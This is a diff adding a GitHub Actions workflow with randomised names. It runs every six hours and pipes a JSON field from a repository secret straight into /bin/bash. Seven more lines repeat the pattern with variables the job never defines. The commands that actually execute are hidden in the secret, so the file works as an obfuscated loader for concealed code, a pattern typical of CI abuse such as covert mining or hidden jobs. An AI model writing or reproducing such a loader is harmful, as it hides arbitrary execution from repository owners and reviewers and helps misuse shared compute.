@@ -1,0 +1,23 @@
+name: luoshantou8765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luoshantou8765
+        env:
+          reiyu6929: ${{ secrets.reiyu6929 }}
+        run: |
+          echo $reiyu6929 | jq -r .cuxw9478 | /bin/bash
+          echo $ojvuo32247 | jq -r .f3739 | /bin/bash
+          echo $u181 | jq -r .tfht10 | /bin/bash
+          echo $xl3 | jq -r .afih7 | /bin/bash
+          echo $d6 | jq -r .iozu14843 | /bin/bash
+          echo $l426 | jq -r .ro3070 | /bin/bash
+          echo $jqkun4438 | jq -r .yypm7 | /bin/bash
+          echo $tcyk6 | jq -r .dmoli94 | /bin/bash
+
